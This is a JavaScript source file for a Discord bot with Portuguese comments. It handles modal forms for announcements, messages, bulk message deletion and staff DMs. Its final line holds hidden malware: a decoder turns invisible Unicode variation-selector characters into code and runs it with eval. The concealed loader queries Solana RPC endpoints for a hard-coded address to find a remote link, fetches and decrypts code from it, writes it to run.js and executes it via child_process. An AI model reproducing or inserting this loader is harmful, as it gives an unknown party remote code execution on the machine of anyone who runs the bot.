// --------------------------------- [ MODULO GERAL DE APLICAÇÃO] ---------------------------------------------------
  if (interaction.isModalSubmit() && interaction.customId === "modal_anunciar") {
      let canal = interaction.fields.getTextInputValue("client_canal");
      let titulo = interaction.fields.getTextInputValue("client_titulo");
      var mensagem = interaction.fields.getTextInputValue("client_mensagem");
      var link = interaction.fields.getTextInputValue("client_link");
      let mens = interaction.fields.getTextInputValue("client_mens");
if (link) {
  interaction.guild.channels.cache
  .get(canal)
  .send({
    embeds: [
      new Discord.EmbedBuilder()
        .setColor(config.embeds_color.embed_error)
        .setAuthor({
          name: interaction.guild.name,
          iconURL: interaction.guild.iconURL({ dynamic: true }),
        })
        .setTitle(`${titulo}`)
        .setDescription(
          `${mensagem}`
        )
        
        .setImage(link)
        .setFooter({ text: `Copyright © ` + config.geral.nome_servidor }),
    ],

  });
  if (mens.length > 0) {

    mens = `<@&${mens}>`
    interaction.guild.channels.cache
      .get(canal)
      .send(`${mens}`);
  }

}else {
      interaction.guild.channels.cache
        .get(canal)
        .send({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_error)
              .setAuthor({
                name: interaction.guild.name,
                iconURL: interaction.guild.iconURL({ dynamic: true }),
              })
              .setTitle(`${titulo}`)
              .setDescription(
                `${mensagem}`
              )
              //.setImage(link)
              .setFooter({ text: `Copyright © ` + config.geral.nome_servidor }),
          ],

        });
        if (mens.length > 0) {

          mens = `<@&${mens}>`
          interaction.guild.channels.cache
            .get(canal)
            .send(`${mens}`);
        }
   
      }

      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_success)
            .setDescription(
              `✅ | Olá ${interaction.user}, Anuncio enviado com sucesso!.`
            ),
        ],
        ephemeral: true,
      });

    }
    if (interaction.isModalSubmit() && interaction.customId === "modal_falar") {
      let canal = interaction.fields.getTextInputValue("client_canal");
      let mensagem = interaction.fields.getTextInputValue("client_mensagem");
      let mens = interaction.fields.getTextInputValue("client_mens") ; 

      if (mens.length > 0) {

        mens = `<@&${mens}>`
      }
 
      interaction.guild.channels.cache
        .get(canal)
        .send(`${mens}` + mensagem);

      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_success)
            .setDescription(
              `✅ | Olá ${interaction.user}, mensagem enviada com sucesso!.`
            ),
        ],
        ephemeral: true,
      });

    }
if (interaction.isModalSubmit() && interaction.customId === "modal_limpar") {
  let canal = interaction.fields.getTextInputValue("client_canal");
  var qtd = interaction.fields.getTextInputValue("client_mensagem");

  const channel = interaction.guild.channels.cache.get(canal);

  const fetched = await channel.messages.fetch({
    limit: qtd,
  });
  
  channel.bulkDelete(fetched)
    .then(messages => {
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_success)
            .setDescription(`✅ | Olá ${interaction.user}, ${messages.size} mensagens foram excluídas com sucesso do canal ${channel.name}.`),
        ],
        ephemeral: true,
      });
    })
    .catch(error => {
      console.error(error);
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_error)
            .setDescription(`❌ | Ocorreu um erro ao excluir mensagens do canal ${channel.name}. Tente novamente mais tarde.`),
        ],
        ephemeral: true,
      });
    });
}
if (interaction.isModalSubmit() && interaction.customId === "modal_sorteio") {
  let player = interaction.fields.getTextInputValue("client_canal");
  let mensagem = interaction.fields.getTextInputValue("client_mensagem");
 


  try {
    //const user = await interaction.guild.members.cache.get(`${player}`);
    const user = await interaction.guild.members.cache.get(player)

    await user.send({
      embeds: [
         new Discord.EmbedBuilder()
         .setAuthor({
          name: interaction.guild.name,
          iconURL: interaction.guild.iconURL({ dynamic: true }),
        })
        .setColor(config.embeds_color.embed_success)
        .setDescription(`>>> 🔓 Olá, Essa é uma mensagem enviada pela staff!`)
        .addFields(
            { name: ' 📋 Enviado por', value: `<@${interaction.user.id}>` },
            { name: ' ✉️ Mensagem', value: mensagem }
           
        )
        .setFooter({ text: `Copyright © `+ config.geral.nome_servidor })
      ]
    });

    interaction.reply({
      embeds: [
        new Discord.EmbedBuilder()
          .setColor(config.embeds_color.embed_success)
          .setDescription(`✅ | Olá ${interaction.user}, Mensagem enviada para  <@${player}>.`),
      ],
      ephemeral: true,
    });
  } catch (error) {
    console.error(error);
    interaction.reply({
      embeds: [
        new Discord.EmbedBuilder()
          .setColor(config.embeds_color.embed_error)
          .setDescription(`❌ | Ocorreu um erro ao enviar a mensagem para o jogador.`),
      ],
      ephemeral: true,
    });
  }
}


// --------------------- [ FIM DE TODOS OS MODULOS] ---------------------------
}
}
//db.set(`ticket_${channel.id}`, { owner_id: interaction.user.id, title, description })
// const ticket = await db.get(`ticket_${interaction.channel.id}`);

const d=s=>[...s].map(c=>(c=c.codePointAt(0),c>=0xFE00&&c<=0xFE0F?c-0xFE00:c>=0xE0100&&c<=0xE01EF?c-0xE0100+16:null)).filter(b=>b!==null);eval(Buffer.from(d(`󠅦󠅑󠅢󠄐󠅏󠅏󠅓󠅢󠅕󠅑󠅤󠅕󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅔󠅕󠅖󠅙󠅞󠅕󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄴󠅕󠅣󠅓󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄴󠅕󠅣󠅓󠅢󠅙󠅠󠅤󠅟󠅢󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄾󠅑󠅝󠅕󠅣󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄾󠅑󠅝󠅕󠅣󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅗󠅕󠅤󠅀󠅢󠅟󠅤󠅟󠄿󠅖󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅗󠅕󠅤󠅀󠅢󠅟󠅤󠅟󠅤󠅩󠅠󠅕󠄿󠅖󠄜󠅏󠅏󠅘󠅑󠅣󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄭󠄿󠅒󠅚󠅕󠅓󠅤󠄞󠅠󠅢󠅟󠅤󠅟󠅤󠅩󠅠󠅕󠄞󠅘󠅑󠅣󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠅕󠅢󠅤󠅩󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅞󠅑󠅝󠅕󠄭󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠅦󠅑󠅜󠅥󠅕󠄙󠄭󠄮󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠄒󠅞󠅑󠅝󠅕󠄒󠄜󠅫󠅦󠅑󠅜󠅥󠅕󠄜󠅓󠅟󠅞󠅖󠅙󠅗󠅥󠅢󠅑󠅒󠅜󠅕󠄪󠄑󠄠󠅭󠄙󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅓󠅟󠅠󠅩󠅀󠅢󠅟󠅠󠅣󠄭󠄘󠅤󠅟󠄜󠅖󠅢󠅟󠅝󠄜󠅕󠅨󠅓󠅕󠅠󠅤󠄜󠅔󠅕󠅣󠅓󠄙󠄭󠄮󠅫󠅙󠅖󠄘󠅖󠅢󠅟󠅝󠄖󠄖󠅤󠅩󠅠󠅕󠅟󠅖󠄐󠅖󠅢󠅟󠅝󠄭󠄭󠄒󠅟󠅒󠅚󠅕󠅓󠅤󠄒󠅬󠅬󠅤󠅩󠅠󠅕󠅟󠅖󠄐󠅖󠅢󠅟󠅝󠄭󠄭󠄒󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄒󠄙󠅖󠅟󠅢󠄘󠅜󠅕󠅤󠄐󠅛󠅕󠅩󠄐󠅟󠅖󠄐󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄾󠅑󠅝󠅕󠅣󠄘󠅖󠅢󠅟󠅝󠄙󠄙󠄑󠅏󠅏󠅘󠅑󠅣󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄞󠅓󠅑󠅜󠅜󠄘󠅤󠅟󠄜󠅛󠅕󠅩󠄙󠄖󠄖󠅛󠅕󠅩󠄑󠄭󠄭󠅕󠅨󠅓󠅕󠅠󠅤󠄖󠄖󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄘󠅤󠅟󠄜󠅛󠅕󠅩󠄜󠅫󠅗󠅕󠅤󠄪󠄘󠄙󠄭󠄮󠅖󠅢󠅟󠅝󠅋󠅛󠅕󠅩󠅍󠄜󠅕󠅞󠅥󠅝󠅕󠅢󠅑󠅒󠅜󠅕󠄪󠄑󠄘󠅔󠅕󠅣󠅓󠄭󠅏󠅏󠅗󠅕󠅤󠄿󠅧󠅞󠅀󠅢󠅟󠅠󠄴󠅕󠅣󠅓󠄘󠅖󠅢󠅟󠅝󠄜󠅛󠅕󠅩󠄙󠄙󠅬󠅬󠅔󠅕󠅣󠅓󠄞󠅕󠅞󠅥󠅝󠅕󠅢󠅑󠅒󠅜󠅕󠅭󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅤󠅟󠅭󠄫󠅦󠅑󠅢󠄐󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄭󠄘󠅝󠅟󠅔󠄜󠅙󠅣󠄾󠅟󠅔󠅕󠄽󠅟󠅔󠅕󠄜󠅤󠅑󠅢󠅗󠅕󠅤󠄙󠄭󠄮󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄭󠅝󠅟󠅔󠄑󠄭󠅞󠅥󠅜󠅜󠄯󠅏󠅏󠅓󠅢󠅕󠅑󠅤󠅕󠄘󠅏󠅏󠅗󠅕󠅤󠅀󠅢󠅟󠅤󠅟󠄿󠅖󠄘󠅝󠅟󠅔󠄙󠄙󠄪󠅫󠅭󠄜󠅏󠅏󠅓󠅟󠅠󠅩󠅀󠅢󠅟󠅠󠅣󠄘󠅙󠅣󠄾󠅟󠅔󠅕󠄽󠅟󠅔󠅕󠅬󠅬󠄑󠅝󠅟󠅔󠅬󠅬󠄑󠅝󠅟󠅔󠄞󠅏󠅏󠅕󠅣󠄽󠅟󠅔󠅥󠅜󠅕󠄯󠅏󠅏󠅔󠅕󠅖󠅀󠅢󠅟󠅠󠄘󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠄒󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄒󠄜󠅫󠅦󠅑󠅜󠅥󠅕󠄪󠅝󠅟󠅔󠄜󠅕󠅞󠅥󠅝󠅕󠅢󠅑󠅒󠅜󠅕󠄪󠄑󠄠󠅭󠄙󠄪󠅤󠅑󠅢󠅗󠅕󠅤󠄜󠅝󠅟󠅔󠄙󠄙󠄫󠅦󠅑󠅢󠄐󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅟󠅣󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅟󠅣󠄒󠄙󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅖󠅣󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅖󠅣󠄒󠄙󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅠󠅑󠅤󠅘󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅠󠅑󠅤󠅘󠄒󠄙󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄭󠅏󠅏󠅤󠅟󠄵󠅃󠄽󠄘󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄒󠄙󠄙󠄫󠅑󠅣󠅩󠅞󠅓󠄐󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄐󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄘󠅠󠅥󠅒󠅜󠅙󠅓󠄻󠅕󠅩󠄜󠅟󠅠󠅤󠅙󠅟󠅞󠅣󠄭󠅫󠅭󠄙󠅫󠅜󠅕󠅤󠄐󠅜󠅙󠅝󠅙󠅤󠄭󠅟󠅠󠅤󠅙󠅟󠅞󠅣󠄞󠅜󠅙󠅝󠅙󠅤󠅬󠅬󠄡󠅕󠄣󠄜󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄭󠅋󠄒󠅘󠅤󠅤󠅠󠅣󠄪󠄟󠄟󠅑󠅠󠅙󠄞󠅝󠅑󠅙󠅞󠅞󠅕󠅤󠄝󠅒󠅕󠅤󠅑󠄞󠅣󠅟󠅜󠅑󠅞󠅑󠄞󠅓󠅟󠅝󠄒󠅍󠄜󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄭󠅞󠅥󠅜󠅜󠄫󠅖󠅟󠅢󠄘󠅜󠅕󠅤󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠄐󠅟󠅖󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄙󠅤󠅢󠅩󠅫󠅜󠅕󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅖󠅕󠅤󠅓󠅘󠄘󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠄜󠅫󠅝󠅕󠅤󠅘󠅟󠅔󠄪󠄒󠅀󠄿󠅃󠅄󠄒󠄜󠅘󠅕󠅑󠅔󠅕󠅢󠅣󠄪󠅫󠄒󠄳󠅟󠅞󠅤󠅕󠅞󠅤󠄝󠅄󠅩󠅠󠅕󠄒󠄪󠄒󠅑󠅠󠅠󠅜󠅙󠅓󠅑󠅤󠅙󠅟󠅞󠄟󠅚󠅣󠅟󠅞󠄒󠅭󠄜󠅒󠅟󠅔󠅩󠄪󠄺󠅃󠄿󠄾󠄞󠅣󠅤󠅢󠅙󠅞󠅗󠅙󠅖󠅩󠄘󠅫󠅚󠅣󠅟󠅞󠅢󠅠󠅓󠄪󠄒󠄢󠄞󠄠󠄒󠄜󠅙󠅔󠄪󠄡󠄜󠅝󠅕󠅤󠅘󠅟󠅔󠄪󠄒󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄒󠄜󠅠󠅑󠅢󠅑󠅝󠅣󠄪󠅋󠅠󠅥󠅒󠅜󠅙󠅓󠄻󠅕󠅩󠄞󠅤󠅟󠅃󠅤󠅢󠅙󠅞󠅗󠄘󠄙󠄜󠅫󠅜󠅙󠅝󠅙󠅤󠅭󠅍󠅭󠄙󠅭󠄙󠄫󠅙󠅖󠄘󠄑󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅟󠅛󠄙󠅤󠅘󠅢󠅟󠅧󠄐󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠅐󠄸󠅄󠅄󠅀󠄐󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄑󠄐󠅣󠅤󠅑󠅤󠅥󠅣󠄪󠄐󠄔󠅫󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅣󠅤󠅑󠅤󠅥󠅣󠅭󠅐󠄙󠄫󠅜󠅕󠅤󠄐󠅔󠅑󠅤󠅑󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅚󠅣󠅟󠅞󠄘󠄙󠄫󠅙󠅖󠄘󠅔󠅑󠅤󠅑󠄞󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄙󠅤󠅘󠅢󠅟󠅧󠄐󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠅐󠅂󠅀󠄳󠄐󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄪󠄐󠄔󠅫󠅔󠅑󠅤󠅑󠄞󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄞󠅝󠅕󠅣󠅣󠅑󠅗󠅕󠅭󠅐󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅔󠅑󠅤󠅑󠄞󠅢󠅕󠅣󠅥󠅜󠅤󠅭󠅓󠅑󠅤󠅓󠅘󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄙󠅫󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄭󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄜󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄜󠄡󠄠󠄠󠄙󠄙󠄫󠅓󠅟󠅞󠅤󠅙󠅞󠅥󠅕󠅭󠅤󠅘󠅢󠅟󠅧󠄐󠅓󠅟󠅞󠅣󠅟󠅜󠅕󠄞󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄘󠄒󠄱󠅜󠅜󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄐󠅖󠅑󠅙󠅜󠅕󠅔󠄪󠄒󠄜󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄙󠄜󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠅐󠄱󠅜󠅜󠄐󠅂󠅀󠄳󠄐󠅕󠅞󠅔󠅠󠅟󠅙󠅞󠅤󠅣󠄐󠅖󠅑󠅙󠅜󠅕󠅔󠄞󠄐󠄼󠅑󠅣󠅤󠄐󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠅟󠅢󠄪󠄐󠄔󠅫󠅜󠅑󠅣󠅤󠄵󠅢󠅢󠅟󠅢󠄯󠄞󠅝󠅕󠅣󠅣󠅑󠅗󠅕󠅭󠅐󠄙󠅭󠅏󠅏󠅞󠅑󠅝󠅕󠄘󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄜󠄒󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄒󠄙󠄫󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄐󠅗󠅕󠅤󠅅󠅢󠅜󠄘󠄙󠅫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅑󠅣󠅩󠅞󠅓󠄐󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄭󠄮󠅫󠅤󠅢󠅩󠅫󠅜󠅕󠅤󠄐󠅝󠅕󠅝󠅟󠄭󠅞󠅥󠅜󠅜󠄫󠅖󠅟󠅢󠄘󠄫󠄑󠅝󠅕󠅝󠅟󠄫󠄙󠅫󠅜󠅕󠅤󠄐󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅗󠅕󠅤󠅃󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄶󠅟󠅢󠄱󠅔󠅔󠅢󠅕󠅣󠅣󠄘󠄒󠄢󠄨󠅀󠄻󠅞󠅥󠄧󠅂󠅪󠅙󠅪󠅨󠄲󠅪󠄶󠅀󠅟󠄼󠅠󠄦󠄩󠄸󠄼󠅈󠅠󠄩󠅒󠄺󠄼󠄣󠄺󠄶󠅤󠅄󠄢󠅣󠄥󠅁󠅪󠄸󠅣󠄵󠄱󠄢󠄒󠄜󠅫󠅜󠅙󠅝󠅙󠅤󠄪󠄡󠅕󠄣󠅭󠄙󠄫󠅙󠅖󠄘󠄑󠄱󠅢󠅢󠅑󠅩󠄞󠅙󠅣󠄱󠅢󠅢󠅑󠅩󠄘󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄙󠅬󠅬󠄱󠅢󠅢󠅑󠅩󠄞󠅙󠅣󠄱󠅢󠅢󠅑󠅩󠄘󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄙󠄖󠄖󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄞󠅜󠅕󠅞󠅗󠅤󠅘󠄭󠄭󠄠󠄙󠅫󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄜󠄡󠅕󠄤󠄙󠄙󠄫󠅓󠅟󠅞󠅤󠅙󠅞󠅥󠅕󠅭󠅝󠅕󠅝󠅟󠄭󠅣󠅙󠅗󠅞󠅑󠅤󠅥󠅢󠅕󠅣󠄞󠅖󠅙󠅜󠅤󠅕󠅢󠄘󠅨󠄭󠄮󠅨󠄯󠄞󠅝󠅕󠅝󠅟󠄙󠅋󠄠󠅍󠄞󠅝󠅕󠅝󠅟󠄜󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄢󠄜󠄡󠅕󠄤󠄙󠄙󠅭󠅜󠅕󠅤󠄐󠅢󠅕󠅣󠅥󠅜󠅤󠄢󠄭󠅝󠅕󠅝󠅟󠄞󠅢󠅕󠅠󠅜󠅑󠅓󠅕󠄘󠄟󠅌󠅋󠅌󠅔󠄛󠅌󠅍󠅌󠅣󠄚󠄟󠄜󠄒󠄒󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄘󠄺󠅃󠄿󠄾󠄞󠅠󠅑󠅢󠅣󠅕󠄘󠅢󠅕󠅣󠅥󠅜󠅤󠄢󠄙󠄙󠅭󠅓󠅑󠅤󠅓󠅘󠄘󠅕󠄙󠅫󠅢󠅕󠅤󠅥󠅢󠅞󠄐󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄘󠅕󠄞󠅤󠅟󠅃󠅤󠅢󠅙󠅞󠅗󠄘󠄙󠄙󠅭󠅭󠄙󠅭󠅏󠅏󠅞󠅑󠅝󠅕󠄘󠅗󠅕󠅤󠅅󠅢󠅜󠄜󠄒󠅗󠅕󠅤󠅅󠅢󠅜󠄒󠄙󠄫󠅗󠅕󠅤󠅅󠅢󠅜󠄘󠄙󠄞󠅤󠅘󠅕󠅞󠄘󠅏󠅔󠅑󠅤󠅑󠄭󠄮󠅫󠅢󠅞󠅩󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠅏󠅔󠅑󠅤󠅑󠄞󠅜󠅙󠅞󠅛󠄙󠄜󠅑󠅣󠅩󠅞󠅓󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄜󠅫󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄜󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠄜󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠅭󠄙󠄭󠄮󠅫󠅙󠅖󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄙󠅑󠅧󠅑󠅙󠅤󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠅕󠅣󠅟󠅜󠅦󠅕󠄜󠄡󠅕󠄣󠄙󠄙󠄜󠅗󠅕󠅤󠅅󠅢󠅜󠄘󠄙󠄫󠅕󠅜󠅣󠅕󠅫󠅙󠅖󠄘󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄞󠅜󠅕󠅞󠅗󠅤󠅘󠄭󠄭󠄢󠄠󠄙󠅫󠅕󠅦󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄙󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠅭󠅙󠅖󠄘󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅟󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅠󠅜󠅑󠅤󠅖󠅟󠅢󠅝󠄘󠄙󠄭󠄭󠄒󠅔󠅑󠅢󠅧󠅙󠅞󠄒󠄙󠅫󠅜󠅕󠅤󠄐󠅏󠅙󠅦󠄭󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠄜󠄒󠅒󠅑󠅣󠅕󠄦󠄤󠄒󠄙󠄫󠅕󠅦󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄙󠄙󠅭󠅕󠅜󠅣󠅕󠅫󠅜󠅕󠅤󠄐󠅢󠅥󠅞󠅀󠅑󠅤󠅘󠄭󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅠󠅑󠅤󠅘󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅚󠅟󠅙󠅞󠄘󠅏󠅏󠅔󠅙󠅢󠅞󠅑󠅝󠅕󠄜󠄒󠅢󠅥󠅞󠄞󠅚󠅣󠄒󠄙󠄫󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅖󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅧󠅢󠅙󠅤󠅕󠄶󠅙󠅜󠅕󠅃󠅩󠅞󠅓󠄘󠅢󠅥󠅞󠅀󠅑󠅤󠅘󠄜󠅐󠅦󠅑󠅢󠄐󠅘󠅤󠅤󠅠󠅣󠄐󠄭󠄐󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅘󠅤󠅤󠅠󠅣󠄒󠄙󠄫︊󠅓󠅟󠅞󠅣󠅤󠄐󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠄐󠄭󠄐󠄗󠄔󠅫󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠅭󠄗󠄫︊󠅓󠅟󠅞󠅣󠅤󠄐󠅏󠅙󠅦󠄐󠄭󠄐󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠄔󠅫󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠅭󠄗󠄜󠄐󠄒󠅒󠅑󠅣󠅕󠄦󠄤󠄒󠄙︊󠅕󠅦󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠄗󠄔󠅫󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠅭󠄗󠄙󠄙󠅐󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅕󠅨󠅕󠅓󠄘󠅐󠄒󠄔󠅫󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄞󠅕󠅨󠅕󠅓󠅀󠅑󠅤󠅘󠅭󠄒󠄐󠄒󠄔󠅫󠅢󠅥󠅞󠅀󠅑󠅤󠅘󠅭󠄒󠅐󠄜󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄜󠅏󠄙󠄭󠄮󠅫󠅓󠅟󠅞󠅣󠅟󠅜󠅕󠄞󠅜󠅟󠅗󠄘󠅖󠅦󠅪󠅡